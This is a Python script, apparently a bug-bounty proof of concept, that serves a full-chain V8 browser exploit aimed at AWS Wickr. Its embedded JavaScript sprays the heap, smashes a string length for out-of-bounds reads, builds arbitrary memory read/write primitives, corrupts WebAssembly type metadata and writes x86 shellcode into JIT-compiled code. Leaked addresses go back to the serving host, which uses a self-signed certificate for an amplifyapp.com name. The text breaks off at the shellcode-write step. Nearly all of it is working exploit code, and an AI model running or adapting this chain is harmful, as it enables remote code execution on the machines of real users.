#!/usr/bin/env python3
"""poc_wlinux.py — Self-contained full-chain PoC for AWS Wickr BBP.

Combines:
  - W77b 4-fire V8 chain (rd64/wr64/addrofLo) — PROVEN on real Wickr
  - W67 W35 confused-call WASM module (probe_mget/mset) — PROVEN in harness
  - Self-contained address derivation (no /params, no external helper)

Chain:
  Pre-chain: WASM module + payfn JIT + spray/S/near/B
  Fire 1: smash S.length → OOB read → find addresses
  Fire 2: restore S.length → B-groom → spray2
  Fire 3: setElements(addrofB) → rd64/wr64/addrofLo
    ├── W35 walk + corrupt supertypes[0] → confused call live
    ├── cage base from ProcessData[0x08]
    ├── memBI from ArrayBuffer walk + cross-validation
    └── TPT walk → payfn Code absolute address
  Fire 4: setElements(nearElem) → restore
    ├── scan payfn JIT code for markers via probe_mget
    ├── write nonce shellcode via probe_mset
    └── payfn(0x1234) → EXEC-OK (nonce 0x13371339)
"""
import http.server, ssl, os, sys, json, time, threading, tempfile, shutil, urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
LEAK_FILE = os.path.join(HERE, "leaked-data-wlinux.json")
leaked = []
DOMAIN = "main.d4zeeqgazhley.amplifyapp.com"

# Harmless nonce-proof shellcode (34 bytes).
# Writes return-address + frame-pointer + nonce 0x13371339 to WASM memory proof slot.
# Returns Smi 0 so the renderer survives for Fire 4 restore.
SHELLCODE = bytes([
    0x4C, 0x8B, 0x55, 0x08,                         # mov r10,[rbp+8]       ; return addr
    0x49, 0xBB, 0,0,0,0,0,0,0,0,                    # mov r11,<proof_slot>  ← patched
    0x4D, 0x89, 0x13,                               # mov [r11],r10
    0x49, 0x89, 0x6B, 0x08,                         # mov [r11+8],rbp
    0x41, 0xC7, 0x43, 0x10, 0x39,0x13,0x37,0x13,   # mov dword[r11+0x10],0x13371339
    0x48, 0x31, 0xC0,                               # xor rax,rax
    0xC9,                                           # leave
    0xC3,                                           # ret
])


def make_cert(cn=DOMAIN):
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    import datetime, ipaddress
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    san = x509.SubjectAlternativeName([x509.DNSName(cn),
                                       x509.DNSName("*.amplifyapp.com"),
                                       x509.IPAddress(ipaddress.ip_address("127.0.0.1"))])
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name)
            .add_extension(san, critical=False).public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime(2020, 1, 1))
            .not_valid_after(datetime.datetime(2038, 1, 1)).sign(key, hashes.SHA256()))
    d = tempfile.mkdtemp(prefix="wlinuxtls_")
    cp, kp = os.path.join(d, "cert.pem"), os.path.join(d, "key.pem")
    open(cp, "wb").write(cert.public_bytes(serialization.Encoding.PEM))
    open(kp, "wb").write(key.private_bytes(serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
    return cp, kp, d


def _js_wasm_module():
    """WASM module bytes (from W67 mkmod). Returns JS code string (no f-string escaping needed)."""
    return r"""
// ======================= WASM module (from W67) ============================
function leb(n){const o=[];do{let b=n&0x7f;n>>>=7;if(n)b|=0x80;o.push(b);}while(n);return o;}
function str(s){const o=[s.length];for(let i=0;i<s.length;i++)o.push(s.charCodeAt(i));return o;}
function sect(id,b){return [id].concat(leb(b.length)).concat(b);}
const I32=0x7f, I64=0x7e, I8=0x78, REF=0x64, FUNCREF=0x70;
const T_A8=0, T_Y=1, T_FR=2, T_FD=3, T_BOX=4;
function mkmod(){
  const types=[
    [0x5E,I8,0x01],[0x50,0x00,0x60,1,I64,1,I64],
    [0x50,0x01,T_Y,0x60,1,I64,1,I64],[0x50,0x00,0x60,1,I64,1,I32],
    [0x5F,0x03,FUNCREF,0x01,FUNCREF,0x01,FUNCREF,0x01],
    [0x60,1,I32,1,REF,T_A8],[0x60,0,1,REF,T_BOX],
    [0x60,2,REF,T_A8,I64,1,I32],[0x60,2,REF,T_A8,I32,1,I32],
    [0x60,3,REF,T_A8,I64,I32,0],[0x60,1,I64,1,I32],[0x60,2,I64,I32,0]];
  const tsec=leb(types.length).concat([].concat.apply([],types));
  const fsec=leb(12).concat([T_Y,T_FR,T_FD,5,6,7,8,T_FD,T_Y,9,10,11]);
  const tabsec=leb(1).concat([FUNCREF,0x01]).concat(leb(1)).concat(leb(1));
  const msec=leb(1).concat([0x00,0x01]);
  const esec=leb(10)
    .concat(str('alloc')).concat([0x00,3])
    .concat(str('mkbox')).concat([0x00,4])
    .concat(str('probe_get')).concat([0x00,5])
    .concat(str('ctl_get')).concat([0x00,6])
    .concat(str('probe_ret')).concat([0x00,7])
    .concat(str('ctl_call')).concat([0x00,8])
    .concat(str('probe_set')).concat([0x00,9])
    .concat(str('probe_mget')).concat([0x00,10])
    .concat(str('probe_mset')).concat([0x00,11])
    .concat(str('mem')).concat([0x02,0]);
  const elemsec=leb(2)
    .concat([0x00,0x41,0x00,0x0b]).concat(leb(1)).concat(leb(1))
    .concat([0x03,0x00]).concat(leb(3)).concat([0,1,2]);
  function body(code){return leb(1+code.length).concat([0]).concat(code);}
  const csec=leb(12)
    .concat(body([0x20,0x00,0x0b]))
    .concat(body([0x20,0x00,0x0b]))
    .concat(body([0x41,0x00,0x0b]))
    .concat(body([0x20,0x00,0xfb,0x07,T_A8,0x0b]))
    .concat(body([0xd2,0x01,0xd2,0x02,0xd2,0x00,0xfb,0x00,T_BOX,0x0b]))
    .concat(body([0x20,0x00,0x20,0x01,0x41,0x00,0x11,T_FD,0x00,0xfb,0x0d,T_A8,0x0b]))
    .concat(body([0x20,0x00,0x20,0x01,0xfb,0x0d,T_A8,0x0b]))
    .concat(body([0x20,0x00,0x41,0x00,0x11,T_FD,0x00,0x0b]))
    .concat(body([0x20,0x00,0x41,0x00,0x11,T_FR,0x00,0x0b]))
    .concat(body([0x20,0x00,0x20,0x01,0x41,0x00,0x11,T_FD,0x00,0x20,0x02,0xfb,0x0e,T_A8,0x0b]))
    .concat(body([0x20,0x00,0x41,0x00,0x11,T_FD,0x00,0x2d,0x00,0x00,0x0b]))
    .concat(body([0x20,0x00,0x41,0x00,0x11,T_FD,0x00,0x20,0x01,0x3a,0x00,0x00,0x0b]));
  return new Uint8Array([0,0x61,0x73,0x6d,1,0,0,0]
    .concat(sect(1,tsec)).concat(sect(3,fsec)).concat(sect(4,tabsec))
    .concat(sect(5,msec)).concat(sect(7,esec)).concat(sect(9,elemsec)).concat(sect(10,csec)));
}
let E=null,box=null,warm8=null,_wmod=null;
function compileModule(){
  try{
    const bytes=mkmod();
    _wmod=new WebAssembly.Module(bytes);
  }catch(e){_wmod=null;}
}
function instantiateWasm(){
  if(!_wmod)return;
  try{
    E=new WebAssembly.Instance(_wmod,{}).exports;
  }catch(e){E=null;}
  if(E){
    try{
      box=E.mkbox();
      warm8=E.alloc(64);
      E.ctl_get(warm8,3);
      E.ctl_call(0x1122334455667788n);
    }catch(e){}
    try{E.probe_ret(0x00000000abcdef01n);}catch(e){}
    try{E.probe_get(warm8,3n);}catch(e){}
    try{E.probe_set(warm8,3n,0);}catch(e){}
    try{E.probe_mget(3n);}catch(e){}
    try{E.probe_mset(3n,0);}catch(e){}
    // plant marker at WASM memory offset 0x40 for self-test
    try{new Uint8Array(E.mem.buffer).set(
      [0x57,0x36,0x37,0x4d,0x45,0x4d,0x4b,0x21],0x40);}catch(e){}
  }
}
// ======================= payfn (JIT marker function) ======================
function payfn(x){
  x|=0;
  x=(x^0x67C0DE10)|0;
  x=(x+0x67C0DE11)|0;
  return(x^0x67C0DE12)|0;
}
let _payacc=0;
for(let i=0;i<400000;i++)_payacc=(_payacc+payfn(i))|0;
"""


def _js_payload(npad_val, spray_n, nelem, newlen, order, tickn, tickms, shellcode_hex):
    """Build the complete JS payload as a list of string parts."""

    # Part 1: head — retry counter, beacon helpers, constants
    head = f"""let _att=parseInt(sessionStorage.wln||'0',10);sessionStorage.wln=String(_att+1);
if(_att>=30){{throw'gave up';}}
const SRV=self.location.origin;
function _sync(d){{try{{d.att=_att;d.npad={npad_val};d.spray={spray_n};d.nelem={nelem};
var x=new XMLHttpRequest();x.open('POST',SRV+'/log',false);
x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(d));}}catch(e){{}}}}
async function _async(d){{try{{d.att=_att;
await fetch(SRV+'/log',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(d)}});}}catch(e){{}}}}

const _NPAD={npad_val},_SPRAYN={spray_n},_NELEM={nelem},_AGEN=60000;
const _NEWLEN={newlen},_ORIGLEN=256,_NEARN=2048,_BLEN=8,_VN=64;
const _WINDOW=_NEWLEN-_ORIGLEN,_HASHF=0x12345672;
const _TICKN={tickn},_TICKMS={tickms};

const _f64=new Float64Array(1),_u32=new Uint32Array(_f64.buffer);
function _fb(hi,lo){{_u32[0]=lo>>>0;_u32[1]=hi>>>0;return _f64[0];}}
function _bo(d){{_f64[0]=d;return[_u32[1]>>>0,_u32[0]>>>0];}}
function _hx(x){{return'0x'+(x>>>0).toString(16);}}
function _hx64(hi,lo){{return'0x'+(hi>>>0).toString(16)+('00000000'+(lo>>>0).toString(16)).slice(-8);}}

const _mkstr=(c)=>{{const a=new Array(_ORIGLEN);for(let i=0;i<_ORIGLEN;i++)a[i]=c;
return String.fromCharCode.apply(null,a);}};
const _age=()=>{{for(let g=0;g<3;g++){{let j=[];for(let i=0;i<_AGEN;i++)j.push({{x:i}});j=null;}}}};
const _settle=async(n,ms)=>{{for(let i=0;i<n;i++)await new Promise(r=>setTimeout(r,ms));}};
"""

    # Part 2: WASM module + payfn (literal, no f-string params)
    wasm = _js_wasm_module()

    # Part 3: setup + fire chain + Fire 1-3 (from W77b, adapted)
    chain = f"""

(async function(){{
// === Pre-chain: payfn warmup + WASM Module compile (before spray) ===
await new Promise(r=>setTimeout(r,500)); // let TurboFan finish payfn
compileModule();

// === Setup: S, near, B, spray ===
const _S=_mkstr(0x41);
let _near=new Array(_NEARN);
let _B=[];
for(let i=0;i<_BLEN;i++)_B.push(1.5+i);
for(let j=0;j<_NEARN;j++)_near[j]=_S;
_near[0]=_B;

let _spray=[];
for(let i=0;i<_SPRAYN;i++){{const a=new Array(_NELEM);for(let j=0;j<_NELEM;j++)a[j]=_S;_spray.push(a);}}

_age();await _settle(_TICKN,_TICKMS);
for(let i=1;i<_spray.length;i+=2)_spray[i]=null;
_age();await _settle(_TICKN,_TICKMS);

// Fire mechanism
let _K=[],_V=[],_T=2;
for(let i=0;i<=_NPAD+1;i++){{_K.push('wln'+i);_V.push(0x20000000);}}
let _src='(class extends Function{{';
for(let i=0;i<_NPAD;i++)_src+='[_K['+i+']]=_V['+i+'];';
_src+='[_K['+_NPAD+']]=_T;';
_src+='}})';
function _fire(payload){{
  _T=2;const C=eval(_src);new C("'use strict'");
  _T=payload;new C("'use strict'");
}}

// ========== FIRE 1: smash ==========
_sync({{ts:new Date().toISOString(),step:'PRE-FIRE1',sLen:_S.length}});
_fire(_fb(_NEWLEN,_HASHF));
_sync({{ts:new Date().toISOString(),step:'POST-FIRE1',sLen:_S.length}});

if(_S.length===_ORIGLEN){{
  await _async({{ts:new Date().toISOString(),result:'NO-SMASH',sLen:_S.length}});
  setTimeout(()=>location.reload(),2500);return;
}}
await _async({{ts:new Date().toISOString(),result:'SMASH-OK',sLen:_S.length,newlen:_NEWLEN}});

// === OOB read: find addresses ===
const _OUT=new Uint8Array(Math.min(_WINDOW,_S.length-_ORIGLEN));
const _W32=new Uint32Array(_OUT.buffer);
const _n=Math.min(_WINDOW,_S.length-_ORIGLEN);
for(let k=0;k<_n;k++)_OUT[k]=_S.charCodeAt(_ORIGLEN+k)&0xff;

const nw=_n>>2;
let rv=0,rrun=0,roff=-1,cv=_W32[0],cr=1;
for(let i=1;i<nw;i++){{
  if(_W32[i]===cv)cr++;
  else{{if(cr>rrun&&(cv&1)){{rrun=cr;rv=cv;roff=i-cr;}}cv=_W32[i];cr=1;}}
}}
if(cr>rrun&&(cv&1)){{rrun=cr;rv=cv;roff=nw-cr;}}
const addrofS=(rrun>=4)?(rv>>>0):0;
const sBase=(addrofS-1)>>>0;
let hdr=-1;
for(let i=0;i+3<nw;i++)
  if(_W32[i+3]===_NEARN*2&&(_W32[i]&1)&&(_W32[i+2]&1)){{hdr=i;break;}}
const emptyFA=hdr>=0?_W32[hdr+1]>>>0:0;
const nearElem=hdr>=0?_W32[hdr+2]>>>0:0;
const addrofB=(roff>=1)?(_W32[roff-1]>>>0):0;
const predicted=(sBase+12+_ORIGLEN+roff*4)>>>0;
const actual=hdr>=0?((nearElem-1+8+4)>>>0):0;
const bOK=(addrofB&1)!==0&&addrofB!==addrofS&&addrofB>0x40000;
const consistent=addrofS!==0&&hdr>=0&&predicted===actual&&bOK;

_sync({{ts:new Date().toISOString(),step:'LEAK',
  addrofS:_hx(addrofS),addrofB:_hx(addrofB),nearElem:_hx(nearElem),
  emptyFA:_hx(emptyFA),rrun:rrun,consistent:consistent}});

if(!consistent){{
  _sync({{step:'PRE-FIRE2-FAIL'}});
  _fire(_fb(_ORIGLEN,_HASHF));
  await _async({{result:'LEAK-FAIL'}});
  setTimeout(()=>location.reload(),2500);return;
}}

// ========== FIRE 2: restore S.length ==========
_sync({{ts:new Date().toISOString(),step:'PRE-FIRE2',sLen:_S.length}});
_fire(_fb(_ORIGLEN,_HASHF));
_sync({{ts:new Date().toISOString(),step:'POST-FIRE2',sLen:_S.length}});

// === B-groom ===
let _vic=[];
for(let i=0;i<_VN;i++)_vic.push(1.1+i);
_spray=null;
for(let w=0;w<6;w++)_age();
await _settle(_TICKN,_TICKMS);

let _spray2=[];
for(let i=0;i<_SPRAYN;i++){{const a=new Array(_NELEM);for(let j=0;j<_NELEM;j++)a[j]=_vic;_spray2.push(a);}}
for(let w=0;w<2;w++)_age();
for(let i=1;i<_spray2.length;i+=2)_spray2[i]=null;
for(let w=0;w<2;w++)_age();
await _settle(_TICKN,_TICKMS);

// ========== FIRE 3: setElements -> arb r/w ==========
function setElements(x){{_fire(_fb(x>>>0,emptyFA));}}
_sync({{ts:new Date().toISOString(),step:'PRE-FIRE3'}});
setElements(addrofB);
_sync({{ts:new Date().toISOString(),step:'POST-FIRE3',sLen:_S.length}});

const bh=_bo(_vic[0]);
const bElemOrig=bh[1]>>>0,bLenSmi=bh[0]>>>0;
_sync({{ts:new Date().toISOString(),step:'FIRE3-CHECK',
  bLenSmi:bLenSmi,expect:_BLEN*2,sLen:_S.length,sOrig:_ORIGLEN}});

if(bLenSmi!==_BLEN*2||_S.length!==_ORIGLEN){{
  _sync({{step:'PRE-FIRE4-MISS'}});
  setElements(nearElem);
  await _async({{result:'OVERLAP-MISS',bLenSmi:bLenSmi,sLen:_S.length}});
  setTimeout(()=>location.reload(),2500);return;
}}

await _async({{ts:new Date().toISOString(),step:'ARB-RW-OK',bElemOrig:_hx(bElemOrig)}});

// arb r/w helpers
const _RD=new Uint32Array(2);
const HUGE=0x10000;
function rd64(A){{
  _vic[0]=_fb(HUGE*2,(A-7)>>>0);
  _f64[0]=_B[0];_RD[0]=_u32[1]>>>0;_RD[1]=_u32[0]>>>0;
}}
function wr64(A,hi,lo){{
  _vic[0]=_fb(HUGE*2,(A-7)>>>0);
  _B[0]=_fb(hi>>>0,lo>>>0);
}}
const ASLOT=5;
function addrofLo(O){{
  _near[ASLOT]=O;
  rd64((nearElem-1+8+ASLOT*4)>>>0);
  _near[ASLOT]=_S;
  return _RD[1]>>>0;
}}
const CAGELIM=0x30000000;
function ptrOK(v){{return(v&1)===1&&(v>>>0)>=0x40&&(v>>>0)<CAGELIM;}}
"""

    # Part 4: W35 walk + corrupt + cage base + memBI + TPT walk (between Fire 3 and Fire 4)
    rce_setup = r"""
// ======================= W35 confused-call setup ==========================
// Instantiate WASM (Module compiled pre-chain; Instance created here to avoid
// disturbing the Fire 3 heap layout).
instantiateWasm();
_sync({step:'WASM-INST',hasE:(E!==null),hasBox:(box!==null)});

// Walk box struct -> funcref -> Map(RTT) -> WasmTypeInfo -> corrupt supertypes[0]
const FLD=new Int32Array(4),MAP=new Int32Array(4),TI=new Int32Array(4);
const TIDX=new Int32Array(4),SLEN=new Int32Array(4),SUP0=new Int32Array(4);
let nwalk=0,iR=-1,iD=-1,iY=-1;

const aBox=box?addrofLo(box):0;
if(ptrOK(aBox)){
  const bb=(aBox-1)>>>0;
  rd64((bb+8)>>>0);  FLD[0]=_RD[1]; FLD[1]=_RD[0];
  rd64((bb+16)>>>0); FLD[2]=_RD[1]; FLD[3]=_RD[0];
  for(let i=0;i<3;i++){
    MAP[i]=0;TI[i]=0;TIDX[i]=-1;SLEN[i]=0;SUP0[i]=0;
    const f=FLD[i]>>>0;
    if(!ptrOK(f))continue;
    rd64((f-1)>>>0);
    const mp=_RD[1]>>>0;
    if(!ptrOK(mp))continue;
    MAP[i]=mp;
    rd64((mp-1+16)>>>0);   // Map: wti at +20 (high word of qword at +16)
    const ti=_RD[0]>>>0;
    if(!ptrOK(ti))continue;
    TI[i]=ti;
    rd64((ti-1+8)>>>0);  TIDX[i]=_RD[1]>>>0;
    rd64((ti-1+16)>>>0); SLEN[i]=_RD[1]>>>0; SUP0[i]=_RD[0]>>>0;
    nwalk++;
  }
}
// Identify $fr (sub of $Y): SUP0[iR] === MAP[iY]
let nedge=0;
for(let i=0;i<3;i++){
  if(TI[i]===0||(SLEN[i]&1)!==0)continue;
  for(let j=0;j<3;j++){
    if(j===i||TI[j]===0)continue;
    if(SUP0[i]===MAP[j]){iR=i;iY=j;nedge++;}
  }
}
if(nedge===1)
  for(let i=0;i<3;i++)
    if(i!==iR&&i!==iY&&TI[i]!==0&&(SLEN[i]&1)===0)iD=i;

const walkOK=nedge===1&&iR>=0&&iD>=0&&iY>=0;

_sync({step:'WALK-OUT',nwalk:nwalk,iR:iR,iD:iD,iY:iY,nedge:nedge,walkOK:walkOK,
  aBox:_hx(aBox),
  f0:_hx(FLD[0]),f1:_hx(FLD[1]),f2:_hx(FLD[2]),
  map0:_hx(MAP[0]),map1:_hx(MAP[1]),map2:_hx(MAP[2]),
  ti0:_hx(TI[0]),ti1:_hx(TI[1]),ti2:_hx(TI[2]),
  slen0:SLEN[0],slen1:SLEN[1],slen2:SLEN[2],
  sup0_0:_hx(SUP0[0]),sup0_1:_hx(SUP0[1]),sup0_2:_hx(SUP0[2])});

let wrote=0;
if(walkOK){
  const tb=(TI[iR]-1)>>>0;
  wr64((tb+16)>>>0,MAP[iD],SLEN[iR]);
  rd64((tb+16)>>>0);
  const rbSup=_RD[0]>>>0,rbLen=_RD[1]>>>0;
  wrote=(rbSup===(MAP[iD]>>>0)&&rbLen===(SLEN[iR]>>>0))?1:0;
  _sync({step:'CORRUPT',wrote:wrote,rbSup:_hx(rbSup),rbLen:rbLen,
    expectSup:_hx(MAP[iD]),expectLen:SLEN[iR]});
}

// ======================= Cage base derivation =============================
// In V8 sandboxed builds, the first bytes of the cage are a null page (zeros).
// The cage_base appears as a recurring high-word in cage-internal pointers.
// Strategy: dump ProcessData, count hi-word occurrences, pick most common.
function _ph(x){return('00000000'+(x>>>0).toString(16)).slice(-8);}
const pdDump=[];
for(let o=0;o<0x100;o+=8){
  rd64(o);
  pdDump.push(_ph(_RD[0])+_ph(_RD[1]));
}
// Count hi-word occurrences (top 32 bits of each qword)
const _hiCounts={};
for(let i=0;i<pdDump.length;i++){
  const hi=parseInt(pdDump[i].substr(0,8),16);
  if(hi>0x100&&hi<0x80000){
    _hiCounts[hi]=(_hiCounts[hi]||0)+1;
  }
}
// Pick smallest hi-word with count>=2 (cage is typically at a lower address than DLLs)
let _cageHi=0;
for(const hi in _hiCounts){
  const h=parseInt(hi);
  if(_hiCounts[h]>=2&&(_cageHi===0||h<_cageHi)) _cageHi=h;
}
let _cageOK=_cageHi>0;
const cageBI=_cageOK?(BigInt(_cageHi)<<32n):0n;
_sync({step:'CAGE',cageHi:_hx(_cageHi),cageOK:_cageOK,
  hiCounts:Object.fromEntries(Object.entries(_hiCounts).filter(([k,v])=>v>=2)),
  pdFirst32:pdDump.slice(0,32)});

// ======================= ArrayBuffer layout discovery =====================
// Compare WASM memory AB (size=0x10000) with calibration AB (size=0x1240)
// to identify byte_length and backing_store field offsets.
const aMemBuf=E&&E.mem?addrofLo(E.mem.buffer):0;
let _blOff=-1,_bsOff=-1,_bsHandle=0;
if(ptrOK(aMemBuf)){
  const calBuf=new ArrayBuffer(0x1240);
  const aCal=addrofLo(calBuf);
  // Compare every 4-byte field between the two ArrayBuffers
  const diffs=[];
  for(let o=0;o<0x40;o+=4){
    rd64((aMemBuf-1+o)>>>0);
    const wmLo=_RD[1]>>>0,wmHi=_RD[0]>>>0;
    rd64((aCal-1+o)>>>0);
    const clLo=_RD[1]>>>0,clHi=_RD[0]>>>0;
    if(wmLo!==clLo||wmHi!==clHi){
      diffs.push({off:o,wasm:wmLo+(wmHi*0x100000000),cal:clLo+(clHi*0x100000000)});
    }
  }
  // Find byte_length field: should have wasm=0x10000, cal=0x1240
  // (or as Smi: wasm=0x20000, cal=0x2480)
  for(const d of diffs){
    if((d.wasm===0x10000&&d.cal===0x1240)||(d.wasm===0x20000&&d.cal===0x2480)){
      _blOff=d.off;
      break;
    }
  }
  // If byte_length not found by exact match, use the first differing field
  // that has plausible size values
  if(_blOff<0&&diffs.length>0){
    for(const d of diffs){
      if(d.wasm>0x1000&&d.wasm<0x200000&&d.cal>0x100&&d.cal<0x200000){
        _blOff=d.off;break;
      }
    }
  }
  // backing_store is typically 8 or 16 bytes after byte_length
  // Try multiple candidate offsets
  if(_blOff>=0){
    for(const delta of [8,12,16,20,24]){
      const candOff=_blOff+delta;
      rd64((aMemBuf-1+candOff)>>>0);
      const handle=_RD[1]>>>0;
      // EPT handle should be a small non-zero value
      if(handle>0&&handle<0x100000){
        _bsOff=candOff;_bsHandle=handle;break;
      }
      // Also check high word
      const handle2=_RD[0]>>>0;
      if(handle2>0&&handle2<0x100000){
        _bsOff=candOff;_bsHandle=handle2;break;
      }
    }
  }
  // If still not found, scan all AB fields for small non-zero values
  if(_bsOff<0){
    for(let o=12;o<0x40;o+=4){
      rd64((aMemBuf-1+o)>>>0);
      // Skip known fields: Map(0), Props(4), Elements(8)
      if(o<12) continue;
      for(const word of [_RD[1]>>>0,_RD[0]>>>0]){
        if(word>0&&word<0x100000&&word!==0x775&&word!==0x69){
          // Verify: calibration AB at same offset should have DIFFERENT value
          rd64((aCal-1+o)>>>0);
          const calW1=_RD[1]>>>0,calW2=_RD[0]>>>0;
          if(word!==calW1&&word!==calW2){
            _bsHandle=word;_bsOff=o;break;
          }
          rd64((aMemBuf-1+o)>>>0); // re-read wasm AB
        }
      }
      if(_bsOff>=0) break;
    }
  }
  // Build compact dump for beacon
  const abCmp=[];
  for(let o=0;o<0x40;o+=4){
    rd64((aMemBuf-1+o)>>>0);
    abCmp.push(_ph(_RD[0])+_ph(_RD[1]));
  }
  _sync({step:'AB-DUMP',aMemBuf:_hx(aMemBuf),blOff:_blOff,bsOff:_bsOff,
    bsHandle:_hx(_bsHandle),diffs:diffs,abCmp:abCmp});
}

// ======================= memBI derivation =================================
// Empirically, memBI = cageBI + 4GB consistently (V8 allocates WASM memory
// at a fixed 4GB offset from cage base). Verify with 1 probe_mget call.
let memBI=0n;
if(_cageOK&&wrote){
  memBI=cageBI+0x100000000n;  // delta = 4GB (empirically constant)
  // Quick validation: read known byte via both rd64 and probe_mget
  rd64((addrofS-1+8)>>>0);
  const exp0=_RD[1]&0xff;
  const target=cageBI+BigInt(addrofS-1+8);
  try{
    const got=E.probe_mget(target-memBI)&0xff;
    if(got!==exp0){
      // Delta is wrong — fall back to coarse scan
      memBI=0n;
      for(let g=-512;g<=512&&!memBI;g++){
        const cand=cageBI+BigInt(g)*0x40000000n;
        try{
          if((E.probe_mget(target-cand)&0xff)===exp0){
            const exp1=(_RD[1]>>8)&0xff;
            if((E.probe_mget(target+1n-cand)&0xff)===exp1) memBI=cand;
          }
        }catch(e){}
      }
    }
  }catch(e){memBI=0n;}
  _sync({step:memBI>0n?'MEMBI-OK':'MEMBI-FAIL',
    memBI:memBI>0n?'0x'+memBI.toString(16):'0x0',
    cageBI:'0x'+cageBI.toString(16),
    delta:memBI>0n?(memBI-cageBI).toString(16):'?'});
}

// ======================= Bank code handle for post-Fire-4 =================
// Read JSFunction.code handle (offset 0x18 in V8 13.0) while rd64 is alive.
let payfnCodeAddr=0n;
let _codeHandle=0;
const aFn=payfn?addrofLo(payfn):0;
if(ptrOK(aFn)){
  rd64((aFn-1+0x18)>>>0);
  _codeHandle=_RD[1]>>>0;
  _sync({step:'CODE-HANDLE',aFn:_hx(aFn),handle:_hx(_codeHandle),
    hi:_hx(_RD[0]),lo:_hx(_RD[1])});
}

// ======================= Marker scan (rd64 — no tier-up risk) ============
// Scan Code object for marker bytes 10 DE C0 67 (=0x67C0DE10 LE) using rd64.
// Code object is in-cage at compressed pointer (_codeHandle - 1).
let _markerCageAddr=0;
if(_codeHandle>0x1000){
  const codeBase=(_codeHandle-1)>>>0;
  // DIAG: peek at first 32 bytes of Code object
  const _peek=[];
  for(let p=0;p<4;p++){
    rd64((codeBase+p*8)>>>0);
    _peek.push([_RD[1]>>>0,_RD[0]>>>0]);
  }
  for(let off=0;off<0x200&&!_markerCageAddr;off+=4){
    rd64((codeBase+off)>>>0);
    const lo=_RD[1]>>>0,hi=_RD[0]>>>0;
    const B=[lo&0xff,(lo>>8)&0xff,(lo>>16)&0xff,(lo>>24)&0xff,
             hi&0xff,(hi>>8)&0xff,(hi>>16)&0xff,(hi>>24)&0xff];
    for(let k=0;k<=4&&!_markerCageAddr;k++){
      if(B[k]===0x10&&B[k+1]===0xDE&&B[k+2]===0xC0&&B[k+3]===0x67){
        _markerCageAddr=(codeBase+off+k)>>>0;
      }
    }
  }
}
_sync({step:'MARKER',cageAddr:_hx(_markerCageAddr),
  absAddr:_markerCageAddr?('0x'+(cageBI+BigInt(_markerCageAddr)).toString(16)):'0x0',
  codeBase:_hx(_codeHandle-1),
  peek:_peek});

// ======================= Bank values for post-Fire-4 ======================
const _bank={
  cageBI:cageBI,
  memBI:memBI,
  codeHandle:_codeHandle,
  markerCageAddr:_markerCageAddr,
  walkOK:walkOK,
  wrote:wrote,
  cageOK:_cageOK,
  bLenSmi:bLenSmi,
  bElemOrig:bElemOrig,
};
_sync({step:'BANK',memBI:'0x'+memBI.toString(16),
  payfnCodeAddr:'0x'+payfnCodeAddr.toString(16),
  walkOK:walkOK,wrote:wrote,cageOK:_cageOK});
"""

    # Part 5: Fire 4 + post-Fire-4 confused call scan + shellcode + exec
    post_fire4 = f"""

// ========== FIRE 4: restore ==========
_vic[0]=_fb(bLenSmi,bElemOrig);
_sync({{ts:new Date().toISOString(),step:'PRE-FIRE4'}});
setElements(nearElem);
_sync({{ts:new Date().toISOString(),step:'POST-FIRE4',sLen:_S.length}});

// ======================= Post-Fire-4: RCE stage ==========================
// rd64 is dead, but confused calls still work.
// Variables from rce_setup (cageBI, memBI, _codeHandle, etc.) persist.

if(!wrote||!_cageOK||memBI===0n){{
  _sync({{step:'DONE',result:'PREREQ-FAIL',wrote:wrote,cageOK:_cageOK,
    memBIz:memBI===0n}});
  setTimeout(()=>location.reload(),3000);
}}else {{

// Confused-call helpers (RAX = T - memBI)
function mget8(T){{return E.probe_mget(T-memBI)&0xff;}}
function mset8(T,b){{E.probe_mset(T-memBI,b&0xff);}}
function mget32(T){{let v=0;for(let k=0;k<4;k++)v|=mget8(T+BigInt(k))<<(8*k);return v>>>0;}}

// Self-test: read planted marker at WASM memory offset 0x40
let selfTestOK=false;
try{{
  const b=mget8(memBI+0x40n);
  selfTestOK=(b===0x57);
  _sync({{step:'SELFTEST',got:b,expected:0x57,ok:selfTestOK}});
}}catch(e){{_sync({{step:'SELFTEST',err:String(e).slice(0,120)}});}}

if(!selfTestOK){{
  _sync({{step:'DONE',result:'SELFTEST-FAIL'}});
  setTimeout(()=>location.reload(),3000);
}}else{{

// ======================= Shellcode write + execute ========================
// Marker was found pre-Fire-4 via rd64. Use banked address directly.
const hits=[];
if(_markerCageAddr>0){{
  hits.push(cageBI+BigInt(_markerCageAddr));
}}

_sync({{step:'SCAN',method:_markerCageAddr?'rd64':'none',
  hits:hits.map(h=>'0x'+h.toString(16)),nProbes:0}});

if(hits.length===0){{
  _sync({{step:'DONE',result:'SCAN-FAIL'}});
  setTimeout(()=>location.reload(),3000);
}}else{{

// Write nonce shellcode over the first marker hit
const shellcodeHex="{shellcode_hex}";
const sc=[];
for(let i=0;i<shellcodeHex.length;i+=2)sc.push(parseInt(shellcodeHex.substr(i,2),16));

// Patch proof_slot address (memBI + 0x100) into bytes 6-13
const proofSlot=memBI+0x100n;
for(let i=0;i<8;i++)sc[6+i]=Number((proofSlot>>(BigInt(i)*8n))&0xffn);

// The marker is at an imm32 opcode: the 2 bytes before the marker
// are the opcode (e.g., 0x81 0xF0 for xor eax,imm32). We start writing
// at marker-2 to overwrite the whole instruction.
const entry=hits[0]-2n;

let wroteOK=0;
try{{
  for(let k=0;k<sc.length;k++)mset8(entry+BigInt(k),sc[k]);
  // Verify first 4 bytes of shellcode (mov r10,[rbp+8] = 4C 8B 55 08)
  const rb0=mget8(entry),rb1=mget8(entry+1n),rb2=mget8(entry+2n),rb3=mget8(entry+3n);
  if(rb0===0x4C&&rb1===0x8B&&rb2===0x55&&rb3===0x08)wroteOK=1;
}}catch(e){{}}

_sync({{step:'SHELLCODE',wroteOK:wroteOK,entry:'0x'+entry.toString(16),
  nHits:hits.length}});
